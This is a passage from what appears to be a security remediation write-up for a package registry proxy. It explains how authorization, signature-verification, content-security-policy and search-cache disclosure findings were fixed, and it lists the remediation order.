  would have answered `403` to every artifact it holds, the properly signed ones
  included. `read_gates` therefore loads the version row and evaluates against
  it — which is what the proxy path has always done, resolving upstream metadata
  before judging. The row is returned to the caller so the re-serve checksum and
  signature verification reuse it instead of querying twice. Two tests hold both
  directions: a signed version passes the gate, an unsigned one still does not.

  For a coordinate with **no** row — everything a Hybrid registry proxies — the
  chain runs minus exactly those two rules (`authorize_unheld_read`). Judging an
  unheld version against `published_at: None` would refuse every proxied
  artifact on a gated registry instead of falling through to the path that can
  resolve the real metadata. It is a *skip*-list rather than an allow-list
  because the failure modes are not symmetric: a rule added later runs by
  default, and if it turns out to read metadata the symptom is a visible
  over-refusal, where an allow-list would silently stop applying it. `block_list`
  is the reason this is not just "rbac only" — a blocked version must still be
  refused, and refused with `AccessDenied`, since `NotFound` is what a Hybrid
  fall-through reads as "ask upstream".
- **Maven and NuGet local reads now appear in the download audit.** Routing them
  through `get_artifact_at_key` routes them through `record_download`, which
  those paths never called. A `mvn install` of one artifact writes an event per
  *file* — `.jar`, `.pom`, and their `.sha1` siblings — so download counts on a
  local Maven registry rise several-fold against what was recorded before. That
  is the proxy path's behaviour exactly (`ProxyService::handle` records once per
  request, `.sha1` requests included), and the previous number was not a lower
  count but an absent one: these reads were the audit gap `record_download`'s own
  doc comment describes.

**Deliberately not changed:**

- **`LocalRegistryService::storage` is still `pub`.** The gate is now on the
  methods, not on the field, so a handler that reaches past them can still read
  bytes ungated. Making it private means moving the deb/rpm publish paths that
  write through it, which is a real improvement and a different diff.
- **`check_visibility` stays separately public.** The console's explore endpoints
  call it on their own authorization path, where the registry's client-facing
  RBAC is not the gate that governs; folding the chain into it would apply
  `[registries.rbac]` to the console.
- **Findings 11 and 12** (search endpoints, explore catalogue) are untouched.
  Their fix is to *filter results*, not to gate a route, and they remain pinned
  as `KnownGap` on the `npm` and `nuget` search rows.

---

## Remediation notes (finding 13)

Three points, because the state was reachable at three and the survey's own
lesson from findings 4–10 is that halves fixed independently leave the other
open.

- **`crates/web/src/handlers/proxy/common.rs`** — `extract_signature_headers`
  returns `Result<Option<ArtifactSignature>, AppError>` instead of a pair of
  `Option`s. `ArtifactSignature` holds bytes **and** type, so the incoherent
  state is not constructible from a request: either header alone is a `400`, and
  so is an `X-Artifact-Signature` that is not valid base64 — that used to
  `.ok()` into `None`, making a malformed signature indistinguishable from an
  absent one under a policy that merely required *a* signature.
  `ArtifactSignature::split` is the single seam back to the two columns the
  stored row has; the thirteen publish handlers changed by one `?`.
- **`local_registry/publish.rs`** — `check_signing_policy` refuses
  bytes-without-type *and* type-without-bytes whenever the registry has a signing
  config. The `allowed_types` lookup is a `match` rather than an `if let` on
  purpose: an absent type short-circuiting that check is the exact shape of the
  finding, and it should not be reintroducible by someone later relaxing the pair
  check above it.
- **`local_registry/read.rs`** — `verify_download_signature` splits what was one
  `else`. No signature at all is still `Ok` and still counted `skipped`, because
  whether an unsigned artifact may exist is publish-time `required`'s question
  and `verify_on_download` must not retroactively refuse everything published
  before signing was switched on. Bytes with no type is an `IntegrityFailure`
  counted `mismatch`, exactly as an unverifiable type already was.

That last one is not redundant with the edge check: it is where **rows written
before the edge check existed** are met. Any artifact already stored with bytes
and no type stops being served the moment `verify_on_download` is on, which is
the correct direction — the operator asked for every served byte to be verified.

**Deliberately not done:** the survey's *"replace the two independent `Option`s
with a single `Option<Signature>`"* stops at the edge. `signature_bytes` and
`signature_type` are still two nullable columns on `PublishedPackage`, read by
the Postgres and in-memory adapters and constructed in ~30 files. Collapsing the
persisted shape is the right end state and a change of its own; the type at the
boundary plus the fail-closed read gets the property without touching the schema.

**Worth an operator's attention:** a registry with `verify_on_download` newly
enabled will start refusing any artifact stored with bytes-and-no-type — that is
the vulnerability being closed, but it surfaces as `502`s on downloads that
worked yesterday. `batlehub_signature_checks_total{outcome="mismatch"}` names
them.

---

## Remediation notes (finding 14)

`protocol_document_csp` (`crates/web/src/middleware/security_headers.rs`), an
`actix_web::middleware::from_fn` wrapped in `server_factory` next to
`security_headers()`. It sends `default-src 'none'; sandbox` on any response
whose path is `/proxy/{registry}/…`, and never overwrites a policy a handler set
itself — the same rule `DefaultHeaders` applies to the baseline three.

Three decisions worth stating, because each was a fork:

- **The whole prefix, not just `text/html`.** Testing the content type would miss
  precisely the case that motivates a CSP: a response whose declared type is
  wrong, or is one of the *other* types a browser renders as a scriptable
  document — `image/svg+xml`, `application/xhtml+xml`. A package manager ignores
  CSP entirely and the header is inert on a download, so the broader scope costs
  a few bytes per artifact and removes the question.
- **Inside the host-routing wrap, and reading the path on the way in.**
  `match_info().unprocessed()` is the *unrouted* remainder, so it is the whole
  path before the router runs and empty after it — reading it on the way out
  matches nothing, which is how the first version of this silently added the
  header to nothing at all. Wrapped inside `HostRoutingMiddlewareFactory`, a
  request arriving as `GET /simple/foo/` on `npm.acme.io` has already been
  rewritten to `/proxy/{registry}/simple/foo/`, so host-routed registries — the
  deployment most likely to have a browser pointed at it — are covered rather
  than skipped. It also uses `unprocessed()` rather than `path()` for the
  percent-encoding reason `extract_registry_from_path` documents: `/proxy/npm%32/…`
  routes to `npm2` while `path()` shows something else.
- **The console is asserted from both sides.** The middleware's tests hold that
  `/` and `/api/**` do *not* get the header; `spa_csp.rs` holds that the console
  document carries its `<meta>` policy and no CSP header, by all three URLs it
  can be reached through. `default-src 'none'` on the SPA is a blank page, so a
  future change that promotes this to a global policy fails a test rather than a
  browser.

**What this does and does not do.** It does not fix an injection — finding 3 did
that. It caps what one is worth: markup that reaches a protocol document now
defaces a page nobody styles instead of reading the tokens the SPA keeps in
`localStorage`.

**Still outstanding from this finding:** the refresh token sits in
`localStorage` beside the access token (`ui/src/composables/useAuth.ts`), so any
future XSS on this origin still yields durable account access rather than a
session-length window. Moving it to an `HttpOnly` cookie is the survey's own
suggestion and belongs in its own RFC — it changes the auth flow, not a header.

---

## Remediation notes (findings 11 and 12)

One disclosure — *the names of packages you may not read* — reachable through
four doors. Both findings named a door each; fixing those two turned up the
other two, and neither was closed by the fix the survey proposed.

**Finding 11, the search routes.**

- `resolve_and_search` authorises the listing first. Only the identity-keyed
  rule runs, on the synthetic coordinate `{registry}/_search`: a search names
  many packages and no single version, so the gate rules have nothing to judge.
- `LocalRegistryService::search_local` replaces the raw `list_package_names`
  read. Each candidate goes through `load_visible_versions` — the same funnel
  findings 4–10 put every other local listing behind — so a name appears only if
  this caller could have listed that package directly. `AccessDenied` is a skip
  rather than an error, for the reason `get_jetbrains_plugins` already skips:
  refusing wholesale because one candidate is private tells the caller a private
  package exists.
- **The cache was the third door, and filtering alone would have left it open.**
  The key is `search:{registry}:{limit}:{query}` — no identity in it — and the
  *merged* result set was what got stored. The first authorised searcher wrote
  their private hits into a shared entry and every later caller of that query
  was served them from rung 1. The cache now holds the upstream answer only; the
  local half is merged per request. There is a regression test, and it was
  confirmed to fail with the two statements in the other order.
- **Rung 3b was the fourth.** When the upstream is down, search answers from
  `held_packages`, which reads the same `package_statuses` table finding 12 is
  about. `LocalSearch` therefore carries `all_names` — every published name,
  never returned to a client — so rung 3b can drop held hits that are locally
  published and let the filtered half put back the ones this caller may see.

**Finding 12, the explore catalogue.** `proxied_visibility_predicate` gates the
`proxied` CTE in `explore_sql` and `count_explore_sql`. A package with no
`local_packages` row is proxied-only and stays public — its name came from
upstream and was never a secret; a package with local rows is listed only if one
of them is visible to this viewer, which is the test `local_pkgs` applies row by
row.

The structural test is per-CTE rather than a count. Counting occurrences cannot
tell *"both CTEs are gated"* from *"one CTE is gated twice"* — and that is
precisely the shape of the bug, where the `newest_version` join carried the
predicate (with a comment explaining why it had to) while the CTE feeding it
carried none.

**Testing.** The in-memory `PackageRepository` reads only its own summaries and
has no local-package store to check visibility against, so this cannot be tested
through the web fixtures at all — the file says so at the top, and the three new
tests are in `pg_explore_visibility.rs` against real Postgres. One of them was
confirmed to fail with the predicate removed; the other two exist because a
visibility gate that over-blocks is a different bug with the same test result: a
proxied-only package and a public hybrid one must both stay listed.

**A consequence worth stating:** `Expect::KnownGap` now has no users. Every gap
the matrix pinned is closed, which made `cargo clippy -D warnings` fail on the
dead variant. It is kept with an `allow` rather than deleted — it is the
ratchet's mechanism, and the next finding should be pinnable the day it is found.

**Cache invalidation, on the way past.** The search cache key is now
`search:v2:…`. Entries written before the local half was split out hold *merged*
hits, private names included — rung 1 would serve them while fresh and rung 3a
for as long as `get_stale` answers. Bumping the key orphans them rather than
racing their TTL. The degraded rungs also gate their local merge on
`SearchMode::Hybrid` now, as rungs 1 and 2 do, so a registry moved from hybrid to
proxy does not get its local packages back through the stale door. And
`resolve_and_search` clamps `limit` to the same `1..=250` `ProxyService::search`
applies, because `search_local` walks every matching name and stops only once it
has *limit hits* — a caller who may see nothing walked the whole registry at
whatever limit the client asked for.

**Deliberately not changed:** `held_packages` still reads `PackageRepository`
without an identity. It is filtered at the call site instead, because the port
has no viewer concept and giving it one touches four implementations — the same
trade recorded for `PackageFilter.registries` under finding 2. The filtering is
sound where it stands: rung 3b's caller knows which names are local.

---

## Suggested remediation order

1. ~~**Finding 1**~~ — **done.** Unauthenticated, trivially exploitable, supply-chain compromise.
2. ~~**Finding 2**~~ — **done.** One-line guard, total catalogue exposure.
3. ~~**Finding 3**~~ — **done.** Escaped at the sink, validated at the edge; the link-injection
   half was a supply-chain vector.
4. ~~**Findings 4–10**~~ — **done.** One systemic change: the chain moved into
   `LocalRegistryService`'s own read funnels. Both halves fixed; findings 15 and 16 fell to the
   same change.
5. ~~**Finding 13**~~ — **done.** Fails closed at both ends, plus the edge that made the state
   reachable at all. It restores a supply-chain control the operator believes is already on.
6. ~~**Findings 11 and 12**~~ — **done.** `local_hits` filtered (and the search cache split, which
   filtering alone would not have closed); the `proxied` CTE gated in both queries.
7. ~~**Finding 14**~~ — **done.** A CSP on all of `/proxy/**`, not just its HTML; it caps the
   blast radius of finding 3's whole class.
8. ~~**Finding 15**~~ — **done** with findings 4–10, which is where it always belonged: it is
   the read path for every `cargo build`, and `get_index` goes through the same listing funnel as
   everything else.
9. ~~**Finding 16**~~ — **done** with findings 4–10; all three routes go through the listing
   funnel.
10. ~~**The authorization matrix**~~ — **built.** `crates/web/tests/authz_matrix.rs`,
    `task authz-matrix`, documented in [authorization-matrix.md](./authorization-matrix.md). It
    already found findings 15 and 16. Extending it to the ecosystems it does not yet cover is now
    the cheapest way to look for more of this class — see that document's coverage section for
    what is still unverified.

Findings 1 and 13 are the two that defeat a control an operator has explicitly configured and
believes is protecting them. Those are worth more than their severity labels suggest.
